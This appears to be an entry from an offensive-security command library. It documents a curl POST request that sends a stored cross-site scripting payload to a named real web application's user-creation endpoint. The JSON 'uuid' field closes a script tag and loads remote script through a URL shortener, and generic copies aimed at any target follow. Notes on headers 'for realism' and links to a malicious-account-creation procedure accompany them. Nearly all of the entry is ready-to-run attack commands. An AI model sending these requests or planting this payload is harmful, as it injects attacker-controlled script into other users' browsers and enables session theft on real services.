---
id: cmd-post-xss-json
data: >-
  curl -X POST https://app.upserve.com/c/user -H "Host: app.upserve.com" -H
  "Connection: close" -H "Content-Length: 118" -H "Accept: application/json" -H
  "Origin: https://app.upserve.com" -H "X-Requested-With: XMLHttpRequest" -H
  "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5)
  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" -H
  "Content-Type: application/json" -H "DNT: 1" -H "Referer:
  https://app.upserve.com/b/test-brand" -H "Accept-Language: en-US,en;q=0.8" -H
  "Cookie: session=abc" -d '{"uuid":"</script><script
  src=//is.gd/z0i2sU>","email":"your.email@example.com","brand_pretty_url":"test-brand"}'
tags:
  - xss
  - post-request
  - json
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.086Z'
verified: false
validated: true
submitted: true
---
# post-create-user-with-xss-uuid-json

## Command

```bash
curl -X POST https://app.upserve.com/c/user \
  -H "Host: app.upserve.com" \
  -H "Connection: close" \
  -H "Content-Length: 118" \
  -H "Accept: application/json" \
  -H "Origin: https://app.upserve.com" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36" \
  -H "Content-Type: application/json" \
  -H "DNT: 1" \
  -H "Referer: https://app.upserve.com/b/test-brand" \
  -H "Accept-Language: en-US,en;q=0.8" \
  -H "Cookie: session=abc" \
  -d '{"uuid":"\</script\><script src=//is.gd/z0i2sU>","email":"your.email@example.com","brand_pretty_url":"test-brand"}'
```

## Description

Alternative POST request using JSON content type for user creation with XSS payload in UUID. Used for reproduction when form-urlencoded varies in server handling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `uuid` | JSON string with payload | Yes |
| `email` | JSON string email | Yes |
| `brand_pretty_url` | JSON string brand | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/c/user -H "Content-Type: application/json" -d '{"uuid":"\</script\><script src=//short.url>","email":"test@example.com","brand_pretty_url":"test"}'
```

### Advanced Usage

Include full headers for realism:

```bash
curl -X POST https://target.com/c/user -H "Content-Type: application/json" -H "Origin: https://target.com" -d '{"uuid":"payload","email":"test@example.com"}'
```

## Expected Output

HTTP/1.1 201 Created with JSON including potentially overridden UUID. Verify storage via later steps.

## Related

- [[commands/post-create-user-with-xss-uuid-form-urlencoded]]
- [[procedures/Submit-Malicious-UUID-for-Account-Creation]]
